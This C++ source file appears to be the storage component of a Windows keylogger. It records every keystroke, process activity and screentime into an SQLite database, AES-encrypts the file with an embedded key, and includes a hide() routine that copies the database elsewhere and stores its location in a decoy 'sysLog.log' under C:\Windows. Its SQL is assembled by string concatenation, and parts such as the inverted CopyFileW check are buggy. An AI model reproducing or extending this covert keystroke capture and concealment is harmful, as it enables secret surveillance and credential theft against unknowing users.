//
// Created by Chrystalkey on 01.07.2019.
//

#include <iostream>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <windows.h>
#include <shlwapi.h>
#include "FlobbelSafe.h"

FlobbelSafe::FlobbelSafe(std::wstring &_safedir):
    safedir(_safedir){
    wchar_t date[11];
    auto n = now();
    int rc = 0;
    init_map();
    db_file = _safedir+L"flobsafe.db";
    //find(); // TODO: add check whether sysLog.log exists, add fallback
    if(PathFileExistsW(db_file.c_str())) {
        decrypt_file(db_file);
    }
    sqlite3_stmt *uniState = nullptr;
    wsprintfW(date,L"%02d_%02d_%04d",n->tm_mday, n->tm_mon+1, n->tm_year+1900);
    keyTable = L"KEYS_"+std::wstring(date)+L"_"+std::wstring(computerHandleStr())+L"_CPACTIVITY";
    proTable = L"PROC_"+std::wstring(date)+L"_"+std::wstring(computerHandleStr())+L"_CPACTIVITY";

    rc = sqlite3_open16(db_file.c_str(),&dbcon);
    sqlErrCheck(rc,L"opening Database "+db_file,dbcon);
    execStmt(dbcon,&uniState,L"CREATE TABLE IF NOT EXISTS "+proTable+L" (pid INT(8),timestamp_on DATETIME, timestamp_off DATETIME, filename TEXT);");
    execStmt(dbcon,&uniState,L"CREATE TABLE IF NOT EXISTS "+keyTable+L" (updown CHAR(2),vkcode INT(8),scancode INT(8),description CHAR(5),timestamp DATETIME);");
    execStmt(dbcon,&uniState,L"CREATE TABLE IF NOT EXISTS screentime (cp_handle INT, timestamp_on DATETIME, timestamp_off DATETIME, duration INT);");
    sqlite3_finalize(uniState);
}
void FlobbelSafe::add_key(KeypressInfo &info){
    if(keyQueue.size() < 13){
        keyQueue.push(L"("+std::wstring(info.updown?L"'U'":L"'D'")+L","
                      +std::to_wstring(info.vkcode)+L","
                      +std::to_wstring(info.scancode)+L","
                      +L"'"+info.descr+L"',"
                      +L"'"+info.timestamp+L"'),");
    }else{
        std::wstring vals;
        while(!keyQueue.empty()){
            vals += keyQueue.front();
            keyQueue.pop();
        }
        *(vals.end()-1) = L';';
        sqlite3_stmt *keyState = nullptr;
        execStmt(dbcon,&keyState,L"INSERT INTO "+keyTable+L" (updown,vkcode,scancode,description,timestamp) VALUES" + vals);
        sqlite3_finalize(keyState);
    }
}
void FlobbelSafe::add_prc(ProcessInfo &info){
    if(prcQueue.size()<13){
        prcQueue.push(L"("
                       +std::to_wstring(info.PID)+L","
                       +L"'"+info.timestamp_on+L"',"
                       +L"'"+info.timestamp_off+L"',"
                       +L"'"+info.filename+L"'),");
    }else{
        std::wstring vals;
        while(!prcQueue.empty()){
            vals += prcQueue.front();
            prcQueue.pop();
        }
        *(vals.end()-1) = L';';
        sqlite3_stmt *prcState = nullptr;
        execStmt(dbcon,&prcState,L"INSERT INTO "+proTable+L" (pid,timestamp_on,timestamp_off,filename) VALUES "+vals);
        sqlite3_finalize(prcState);
    }
}
void FlobbelSafe::add_screentime(Screentime &info){
    sqlite3_stmt *scrState = nullptr;
    execStmt(dbcon,&scrState,L"INSERT INTO screentime (cp_handle,timestamp_on,timestamp_off,duration) VALUES("
                              +std::to_wstring(info.ch)+L","
                              +L"'"+info.timestamp_on+L"',"
                              +L"'"+info.timestamp_off+L"',"
                              +std::to_wstring(info.duration)+L");"
    );
    sqlite3_finalize(scrState);
}
void FlobbelSafe::finalize_queues() {
    std::wstring vals;
    if (!prcQueue.empty()) {
        while (!prcQueue.empty()) {
            vals += prcQueue.front();
            prcQueue.pop();
        }
        *(vals.end() - 1) = L';';
        sqlite3_stmt *prcState = nullptr;
        execStmt(dbcon, &prcState,
                 L"INSERT INTO " + proTable + L" (pid,timestamp_on,timestamp_off,filename) VALUES " + vals);
        sqlite3_finalize(prcState);
    }
    if (!keyQueue.empty()) {
        vals = L"";
        while (!keyQueue.empty()) {
            vals += keyQueue.front();
            keyQueue.pop();
        }
        *(vals.end() - 1) = L';';
        sqlite3_stmt *keyState = nullptr;
        execStmt(dbcon, &keyState,
                 L"INSERT INTO " + keyTable + L" (updown,vkcode,scancode,description,timestamp) VALUES" + vals);
        sqlite3_finalize(keyState);
    }
}
FlobbelSafe::~FlobbelSafe() {
    finalize_queues();
    sqlite3_close(dbcon);
    encrypt_file(db_file);
    //hide();
}
void FlobbelSafe::encrypt_file(const std::wstring &file) {
    std::ifstream in(converter.to_bytes(file), std::ios::binary|std::ios::ate);
    if(!in.is_open()){
        std::wcerr << "ERROR opening Infile(" << file << ") not opened\n";
        return;
    }
    std::streamsize size = in.tellg();
    in.seekg(0,std::ios::beg);

    buffer.resize(size, 0x00);
    if(in.read((char*)buffer.data(),size)){
        in.close();
        CryptoPP::SecByteBlock key(_key,32);
        CryptoPP::SecByteBlock iv(_iv,16);
        CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption enc(key,key.size(),iv);
        enc.ProcessData(buffer.data(),buffer.data(),buffer.size());
        std::ofstream out(converter.to_bytes(file),std::ios::binary|std::ios::trunc);
        out.write((char*)buffer.data(),buffer.size());
        out.close();
    }else{
        std::wcout << "ERROR reading file(" << file+L"flobsafe.db" << ")\n";
    }
}
void FlobbelSafe::decrypt_file(const std::wstring &file) {
    std::ifstream in(converter.to_bytes(file), std::ios::binary|std::ios::ate);
    if(!in.is_open()){
        std::wcerr << "ERROR opening Infile(" << file << ") not opened\n";
        return;
    }
    std::streamsize size = in.tellg();
    in.seekg(0,std::ios::beg);

    buffer.resize(size, 0x00);
    if(in.read((char*)buffer.data(),size)){
        in.close();
        CryptoPP::SecByteBlock key(_key,32);
        CryptoPP::SecByteBlock iv(_iv,16);
        CryptoPP::CFB_Mode<CryptoPP::AES>::Decryption dec(key,key.size(),iv);
        dec.ProcessData(buffer.data(),buffer.data(),buffer.size());
        std::ofstream out(converter.to_bytes(file),std::ios::binary|std::ios::trunc);
        out.write((char*)buffer.data(),buffer.size());
        out.close();
    }else{
        std::wcout << "ERROR reading file(" << file+L"flobsafe.db" << ")\n";
    }
}
void FlobbelSafe::hide(){
    HKEY hkey;
    uint32_t x = 0;
    auto it = rnd_directories.begin();
    std::advance(it,rand()%rnd_directories.size());
    x = it->first;
    std::ofstream file("C:\\Windows\\sysLog.log",std::ios::trunc);
    file << std::to_string(x);
    file.close();
    if(CopyFileW(db_file.c_str(),rnd_directories.at(x).c_str(),FALSE)){
        std::wcerr << "ERROR Unable to Copy file to " << rnd_directories.at(x) << L"\n";
        return;
    }
}
void FlobbelSafe::find(){
    HKEY hkey;
    uint32_t x = 0;
    std::ifstream file("C:\\Windows\\sysLog.log");
    file >> x;
    db_file = rnd_directories.at(x);
    RegCloseKey(hkey);
}

void FlobbelSafe::init_map() {
    std::wstring list[] = {
            L"D:\\Temp\\flobsafe.db"
    };
    for(int i = 0; i < 1; i++)
        rnd_directories.insert_or_assign(hash(list[i]),list[i]);
}

uint32_t FlobbelSafe::hash(std::wstring &text) { //256 bit/32 byte
    CryptoPP::byte digest[CryptoPP::SHA256::DIGESTSIZE];
    CryptoPP::SHA256().CalculateDigest(digest,(CryptoPP::byte*)text.c_str(),text.size()*sizeof(wchar_t));
    uint32_t sumtotal = (uint32_t)*digest;
    sumtotal += (uint32_t)*(digest+4);
    sumtotal += (uint32_t)*(digest+8);
    sumtotal += (uint32_t)*(digest+12);
    sumtotal += (uint32_t)*(digest+16);
    sumtotal += (uint32_t)*(digest+20);
    sumtotal += (uint32_t)*(digest+24);
    sumtotal += (uint32_t)*(digest+28);
    for(;rnd_directories.count(sumtotal)!=0;sumtotal++);
    return sumtotal;
}